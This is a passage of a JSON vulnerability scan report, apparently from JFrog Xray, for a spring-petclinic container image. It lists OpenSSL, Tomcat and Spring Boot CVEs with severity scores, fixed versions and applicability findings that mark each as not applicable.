                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The vulnerability is only applicable if the vulnerable functions `EVP_CipherInit_ex2`, `EVP_EncryptInit_ex2, or `EVP_DecryptInit_ex2` is called directly or indirectly with an `OSSL_PARAM` array that alters the `ivlen` and `keylen` parameters. Moreover, it only impacts the following ciphers: RC2, RC4, RC5, and the following cipher modes: CCM, GCM, OCB.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Changing the key or IV lengths is not considered a popular operation. Furthermore, the API only affects OpenSSL 3.x and it is likely the app developers have discovered the problem during testing, as it would have caused the decryption to fail.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The given CVSS score does not take into account the unlikely prerequisites and the context required to exploit this CVE.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "In the case that this vulnerability is exploited successfully, an attacker can read sensitive data as plaintext, breaking the encryption.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OpenSSL Advisory",
                  "Url": "https://www.openssl.org/news/secadv/20231024.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix Commit",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=0df40630850fb2740e6be6890bb905d3fc623b2d",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-5363",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-5363",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-534478",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: A bug has been identified in the processing of key and\ninitialisation vector (IV) lengths.  This can lead to potential truncation\nor overruns during the initialisation of some symmetric ciphers.\n\nImpact summary: A truncation in the IV can result in non-uniqueness,\nwhich could result in loss of confidentiality for some cipher modes.\n\nWhen calling EVP_EncryptInit_ex2(), EVP_DecryptInit_ex2() or\nEVP_CipherInit_ex2() the provided OSSL_PARAM array is processed after\nthe key and IV have been established.  Any alterations to the key length,\nvia the \"keylen\" parameter or the IV length, via the \"ivlen\" parameter,\nwithin the OSSL_PARAM array will not take effect as intended, potentially\ncausing truncation or overreading of these values.  The following ciphers\nand cipher modes are impacted: RC2, RC4, RC5, CCM, GCM and OCB.\n\nFor the CCM, GCM and OCB cipher modes, truncation of the IV can result in\nloss of confidentiality.  For example, when following NIST's SP 800-38D\nsection 8.2.1 guidance for constructing a deterministic IV for AES in\nGCM mode, truncation of the counter portion could lead to IV reuse.\n\nBoth truncations and overruns of the key and overruns of the IV will\nproduce incorrect results and could, in some cases, trigger a memory\nexception.  However, these issues are not currently assessed as security\ncritical.\n\nChanging the key and/or IV lengths is not considered to be a common operation\nand the vulnerable API was recently introduced. Furthermore it is likely that\napplication developers will have spotted this problem during testing since\ndecryption would fail unless both peers in the communication were similarly\nvulnerable. For these reasons we expect the probability of an application being\nvulnerable to this to be quite low. However if an application is vulnerable then\nthis issue is considered very serious. For these reasons we have assessed this\nissue as Moderate severity overall.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are...",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.1.4-r0"
            ],
            "fixed_versions": [
               "3.1.4-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-5363",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "Issue summary: A bug has been identified in the processing of key and\ninitialisation vector (IV) lengths.  This can lead to potential truncation\nor overruns during the initialisation of some symmetric ciphers.\n\nImpact summary: A truncation in the IV can result in non-uniqueness,\nwhich could result in loss of confidentiality for some cipher modes.\n\nWhen calling EVP_EncryptInit_ex2(), EVP_DecryptInit_ex2() or\nEVP_CipherInit_ex2() the provided OSSL_PARAM array is processed after\nthe key and IV have been established.  Any alterations to the key length,\nvia the \"keylen\" parameter or the IV length, via the \"ivlen\" parameter,\nwithin the OSSL_PARAM array will not take effect as intended, potentially\ncausing truncation or overreading of these values.  The following ciphers\nand cipher modes are impacted: RC2, RC4, RC5, CCM, GCM and OCB.\n\nFor the CCM, GCM and OCB cipher modes, truncation of the IV can result in\nloss of confidentiality.  For example, when following NIST's SP 800-38D\nsection 8.2.1 guidance for constructing a deterministic IV for AES in\nGCM mode, truncation of the counter portion could lead to IV reuse.\n\nBoth truncations and overruns of the key and overruns of the IV will\nproduce incorrect results and could, in some cases, trigger a memory\nexception.  However, these issues are not currently assessed as security\ncritical.\n\nChanging the key and/or IV lengths is not considered to be a common operation\nand the vulnerable API was recently introduced. Furthermore it is likely that\napplication developers will have spotted this problem during testing since\ndecryption would fail unless both peers in the communication were similarly\nvulnerable. For these reasons we expect the probability of an application being\nvulnerable to this to be quite low. However if an application is vulnerable then\nthis issue is considered very serious. For these reasons we have assessed this\nissue as Moderate severity overall.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are...",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-534478",
            "VulnerabilityTitle": "",
            "ShortDescription": "A design problem in OpenSSL 3.x may lead to data leakage when processing cipher parameters.",
            "FullDescription": "OpenSSL is an open-source cryptographic library and toolset that provides a wide range of protocol supported and functions for secure communication, data encryption, digital certificates, and other cryptographic operations, widely used in various software applications and systems.\nIn cryptography, a block cipher is a symmetric key algorithm that encrypts fixed-size blocks of data, typically 64 or 128 bits, transforming each block into a corresponding ciphertext block using a key-specific permutation.\n\nA major problem with block ciphers, is that equal plaintext blocks get transformed to equal ciphertexts. This can be used for a known-plaintext attack, where an adversary possesses both the plaintext and its corresponding encrypted form, aiming to deduce the encryption key or gain insights into the encryption algorithm.\n\nTo counter this, we use an Initialization vector (IV), which is a random or unique input to a cryptographic algorithm used to alter the first block of the cipher, ensuring equal plaintext blocks won’t be transformed to equal ciphertexts.\n\nA vulnerability was found in OpenSSL 3.x, in certain situations, parameters such as key length or IV length, will be processed after the key and IV have been established, hence they will not take effect as intended, potentially causing truncation or overreading of these values, impacting the confidentiality of the encryption.\n\nWhen calling the functions `EVP_CipherInit_ex2`, `EVP_EncryptInit_ex2, or `EVP_DecryptInit_ex2` with an `OSSL_PARAM` array, changes to the `keylen` or `ivlen` parameters will only be processed after the IV and the key have been established.\n\nNote this impacts the following ciphers: RC2, RC4, RC5, and the following cipher modes: CCM, GCM, OCB.",
            "Impact": 5,
            "VulnerabilityType": "Data leakage",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The vulnerability is only applicable if the vulnerable functions `EVP_CipherInit_ex2`, `EVP_EncryptInit_ex2, or `EVP_DecryptInit_ex2` is called directly or indirectly with an `OSSL_PARAM` array that alters the `ivlen` and `keylen` parameters. Moreover, it only impacts the following ciphers: RC2, RC4, RC5, and the following cipher modes: CCM, GCM, OCB.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Changing the key or IV lengths is not considered a popular operation. Furthermore, the API only affects OpenSSL 3.x and it is likely the app developers have discovered the problem during testing, as it would have caused the decryption to fail.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The given CVSS score does not take into account the unlikely prerequisites and the context required to exploit this CVE.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "In the case that this vulnerability is exploited successfully, an attacker can read sensitive data as plaintext, breaking the encryption.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OpenSSL Advisory",
                  "Url": "https://www.openssl.org/news/secadv/20231024.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix Commit",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=0df40630850fb2740e6be6890bb905d3fc623b2d",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-5363",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-5363",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607927",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "If an X.509 certificate contains a malformed policy constraint and\npolicy processing is enabled, then a write lock will be taken twice\nrecursively.  On some operating systems (most widely: Windows) this\nresults in a denial of service when the affected process hangs.  Policy\nprocessing being enabled on a publicly facing server is not considered\nto be a common setup.\n\nPolicy processing is enabled by passing the `-policy'\nargument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.\n\nUpdate (31 March 2023): The description of the policy processing enablement\nwas corrected based on CVE-2023-0466.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.0.7-r2"
            ],
            "fixed_versions": [
               "3.0.7-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-3996",
                     "cwe": [
                        "CWE-667"
                     ],
                     "cwe_details": {
                        "CWE-667": {
                           "name": "Improper Locking",
                           "description": "The product does not properly acquire or release a lock on a resource, leading to unexpected resource state changes and behaviors."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "If an X.509 certificate contains a malformed policy constraint and\npolicy processing is enabled, then a write lock will be taken twice\nrecursively.  On some operating systems (most widely: Windows) this\nresults in a denial of service when the affected process hangs.  Policy\nprocessing being enabled on a publicly facing server is not considered\nto be a common setup.\n\nPolicy processing is enabled by passing the `-policy'\nargument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.\n\nUpdate (31 March 2023): The description of the policy processing enablement\nwas corrected based on CVE-2023-0466.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-607927",
            "VulnerabilityTitle": "",
            "ShortDescription": "A design problem in OpenSSL 3.x may lead to denial of service in Windows when processing a malformed policy.",
            "FullDescription": "[OpenSSL](https://www.openssl.org/) is a software library for applications that provide secure communications over computer networks against eavesdropping or need to identify the party at the other end. It is widely used by Internet servers, including the majority of HTTPS websites.\n\nIt was discovered that when an X.509 certificate contains a bad policy constraint and policy processing is enabled, the write lock is acquired recursively twice.\nOn Windows, this results in a deadlock and a denial of service when the affected process hangs.\n\nThe issue results due to the `ossl_policy_cache_set_mapping()` obtaining the X.509 lock a second time before the `ossl_policy_cache_set()` function releases it.\n\nOn Linux using `pthreads` - the second attempt to obtain the lock simply fails without any security impact.\nOn Windows it seems that attempting to obtain the lock a second time hangs.\n\nTo exploit this issue, Policy Processing must be enabled, which is highly unlikely for a publicly-facing server.\n\nPolicy processing is enabled by passing the `-policy` argument to the command line utilities or by calling either `X509_VERIFY_PARAM_add0_policy()` or `X509_VERIFY_PARAM_set1_policies()` functions.\n\nThis issue only affects the Windows version of OpenSSL 3.x.",
            "Impact": 4,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must cause OpenSSL 3.x to verify a crafted certificate containing a malformed policy constraint, and the certificate must pass OpenSSL's signature verification (either be signed by a valid CA or any certificate if the client chooses to approve self-signed certificates).\nAlso, the server must have Policy Processing enabled, which is highly unlikely for a publicly-facing server.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Official OpenSSL Advisory",
                  "Url": "https://www.openssl.org/news/secadv/20221213.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official Fix Commit",
                  "Url": "https://github.com/openssl/openssl/commit/7725e7bfe6f2ce8146b6552b44e0d226be7638e7",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2022-3996",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The CVE is only applicable on the Windows operating system",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2022-3996",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607927",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "If an X.509 certificate contains a malformed policy constraint and\npolicy processing is enabled, then a write lock will be taken twice\nrecursively.  On some operating systems (most widely: Windows) this\nresults in a denial of service when the affected process hangs.  Policy\nprocessing being enabled on a publicly facing server is not considered\nto be a common setup.\n\nPolicy processing is enabled by passing the `-policy'\nargument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.\n\nUpdate (31 March 2023): The description of the policy processing enablement\nwas corrected based on CVE-2023-0466.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.0.7-r2"
            ],
            "fixed_versions": [
               "3.0.7-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-3996",
                     "cwe": [
                        "CWE-667"
                     ],
                     "cwe_details": {
                        "CWE-667": {
                           "name": "Improper Locking",
                           "description": "The product does not properly acquire or release a lock on a resource, leading to unexpected resource state changes and behaviors."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "If an X.509 certificate contains a malformed policy constraint and\npolicy processing is enabled, then a write lock will be taken twice\nrecursively.  On some operating systems (most widely: Windows) this\nresults in a denial of service when the affected process hangs.  Policy\nprocessing being enabled on a publicly facing server is not considered\nto be a common setup.\n\nPolicy processing is enabled by passing the `-policy'\nargument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.\n\nUpdate (31 March 2023): The description of the policy processing enablement\nwas corrected based on CVE-2023-0466.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-607927",
            "VulnerabilityTitle": "",
            "ShortDescription": "A design problem in OpenSSL 3.x may lead to denial of service in Windows when processing a malformed policy.",
            "FullDescription": "[OpenSSL](https://www.openssl.org/) is a software library for applications that provide secure communications over computer networks against eavesdropping or need to identify the party at the other end. It is widely used by Internet servers, including the majority of HTTPS websites.\n\nIt was discovered that when an X.509 certificate contains a bad policy constraint and policy processing is enabled, the write lock is acquired recursively twice.\nOn Windows, this results in a deadlock and a denial of service when the affected process hangs.\n\nThe issue results due to the `ossl_policy_cache_set_mapping()` obtaining the X.509 lock a second time before the `ossl_policy_cache_set()` function releases it.\n\nOn Linux using `pthreads` - the second attempt to obtain the lock simply fails without any security impact.\nOn Windows it seems that attempting to obtain the lock a second time hangs.\n\nTo exploit this issue, Policy Processing must be enabled, which is highly unlikely for a publicly-facing server.\n\nPolicy processing is enabled by passing the `-policy` argument to the command line utilities or by calling either `X509_VERIFY_PARAM_add0_policy()` or `X509_VERIFY_PARAM_set1_policies()` functions.\n\nThis issue only affects the Windows version of OpenSSL 3.x.",
            "Impact": 4,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must cause OpenSSL 3.x to verify a crafted certificate containing a malformed policy constraint, and the certificate must pass OpenSSL's signature verification (either be signed by a valid CA or any certificate if the client chooses to approve self-signed certificates).\nAlso, the server must have Policy Processing enabled, which is highly unlikely for a publicly-facing server.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Official OpenSSL Advisory",
                  "Url": "https://www.openssl.org/news/secadv/20221213.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official Fix Commit",
                  "Url": "https://github.com/openssl/openssl/commit/7725e7bfe6f2ce8146b6552b44e0d226be7638e7",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2022-3996",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The CVE is only applicable on the Windows operating system",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2022-3996",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-695197",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "maven",
         "summary": "Improper Input Validation vulnerability in Apache Tomcat. Incorrect error handling for some invalid HTTP priority headers resulted in incomplete clean-up of the failed request which created a memory leak. A large number of such requests could trigger an OutOfMemoryException resulting in a denial of service.\n\nThis issue affects Apache Tomcat: from 9.0.76 through 9.0.102, from 10.1.10 through 10.1.39, from 11.0.0-M2 through 11.0.5.\n\nUsers are recommended to upgrade to version 9.0.104, 10.1.40 or 11.0.6 which fix the issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "org.apache.tomcat.embed:tomcat-embed-core",
         "source_id": "gav://org.apache.tomcat.embed:tomcat-embed-core",
         "source_comp_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.34",
         "component_versions": {
            "id": "org.apache.tomcat.embed:tomcat-embed-core",
            "vulnerable_versions": [
               "10.1.10 ≤ Version < 10.1.40",
               "11.0.0-M2 ≤ Version < 11.0.6",
               "9.0.76 ≤ Version ≤ 9.0.102"
            ],
            "fixed_versions": [
               "10.1.40",
               "11.0.6",
               "9.0.104"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-31650",
                     "cwe": [
                        "CWE-460",
                        "CWE-459"
                     ],
                     "cwe_details": {
                        "CWE-459": {
                           "name": "Incomplete Cleanup",
                           "description": "The product does not properly clean up and remove temporary or supporting resources after they have been used."
                        },
                        "CWE-460": {
                           "name": "Improper Cleanup on Thrown Exception",
                           "description": "The product does not clean up its state or incorrectly cleans up its state when an exception is thrown, leading to unexpected state or control flow."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Improper Input Validation vulnerability in Apache Tomcat. Incorrect error handling for some invalid HTTP priority headers resulted in incomplete clean-up of the failed request which created a memory leak. A large number of such requests could trigger an OutOfMemoryException resulting in a denial of service.\n\nThis issue affects Apache Tomcat: from 9.0.76 through 9.0.102, from 10.1.10 through 10.1.39, from 11.0.0-M2 through 11.0.5.\n\nUsers are recommended to upgrade to version 9.0.104, 10.1.40 or 11.0.6 which fix the issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__0de9bc61c159b4975a9ca51cebd71c7c144733045ed041525f52326f1f3fbd66.tar.gz/app/app.jar/META-INF/sbom/application.cdx.json/org.springframework.samples:spring-petclinic:3.4.0-SNAPSHOT/gav:/org.apache.tomcat.embed:tomcat-embed-core:10.1.34/org.apache.tomcat.embed:tomcat-embed-core:10.1.34",
            "sha256__0de9bc61c159b4975a9ca51cebd71c7c144733045ed041525f52326f1f3fbd66.tar.gz/app/app.jar/BOOT-INF/lib/tomcat-embed-core-10.1.34.jar"
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.34",
            "cve_id": "CVE-2025-31650",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "Apache Tomcat is not configured to run with the vulnerable HTTP/2 protocol enabled",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.34",
            "vulnerability_id": "CVE-2025-31650",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-695110",
         "severity": "High",
         "severity_source": "GitHub Security Advisory",
         "pkg_type": "maven",
         "summary": "EndpointRequest.to() creates a matcher for null/** if the actuator endpoint, for which the EndpointRequest has been created, is disabled or not exposed.\n\nYour application may be affected by this if all the following conditions are met:\n\n  *  You use Spring Security\n  *  EndpointRequest.to() has been used in a Spring Security chain configuration\n  *  The endpoint which EndpointRequest references is disabled or not exposed via web\n  *  Your application handles requests to /null and this path needs protection\n\n\nYou are not affected if any of the following is true:\n\n  *  You don't use Spring Security\n  *  You don't use EndpointRequest.to()\n  *  The endpoint which EndpointRequest.to() refers to is enabled and is exposed\n  *  Your application does not handle requests to /null or this path does not need protection",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "org.springframework.boot:spring-boot",
         "source_id": "gav://org.springframework.boot:spring-boot",
         "source_comp_id": "gav://org.springframework.boot:spring-boot:3.4.2",
         "component_versions": {
            "id": "org.springframework.boot:spring-boot",
            "vulnerable_versions": [
               "≤ 2.7.24.2",
               "3.1.0 ≤ Version ≤ 3.1.15.2",
               "3.2.0 ≤ Version ≤ 3.2.13.2",
               "3.3.0 ≤ Version ≤ 3.3.10",
               "3.4.0 ≤ Version ≤ 3.4.4"
            ],
            "fixed_versions": [
               "3.3.11",
               "3.4.5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-22235",
                     "cwe": [
                        "CWE-20",
                        "CWE-862"
                     ],
                     "cwe_details": {
                        "CWE-20": {
                           "name": "Improper Input Validation",
                           "description": "The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "6"
                              }
                           ]
                        },
                        "CWE-862": {
                           "name": "Missing Authorization",
                           "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "11"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
                  }
               ],
               "description": "EndpointRequest.to() creates a matcher for null/** if the actuator endpoint, for which the EndpointRequest has been created, is disabled or not exposed.\n\nYour application may be affected by this if all the following conditions are met:\n\n  *  You use Spring Security\n  *  EndpointRequest.to() has been used in a Spring Security chain configuration\n  *  The endpoint which EndpointRequest references is disabled or not exposed via web\n  *  Your application handles requests to /null and this path needs protection\n\n\nYou are not affected if any of the following is true:\n\n  *  You don't use Spring Security\n  *  You don't use EndpointRequest.to()\n  *  The endpoint which EndpointRequest.to() refers to is enabled and is exposed\n  *  Your application does not handle requests to /null or this path does not need protection",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__0de9bc61c159b4975a9ca51cebd71c7c144733045ed041525f52326f1f3fbd66.tar.gz/app/app.jar/META-INF/sbom/application.cdx.json/org.springframework.samples:spring-petclinic:3.4.0-SNAPSHOT/gav:/org.springframework.boot:spring-boot:3.4.2/org.springframework.boot:spring-boot:3.4.2",
            "sha256__0de9bc61c159b4975a9ca51cebd71c7c144733045ed041525f52326f1f3fbd66.tar.gz/app/app.jar/BOOT-INF/lib/spring-boot-3.4.2.jar"
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "gav://org.springframework.boot:spring-boot:3.4.2",
            "cve_id": "CVE-2025-22235",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable method EndpointRequest.to is never called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "gav://org.springframework.boot:spring-boot:3.4.2",
            "vulnerability_id": "CVE-2025-22235",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-608309",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
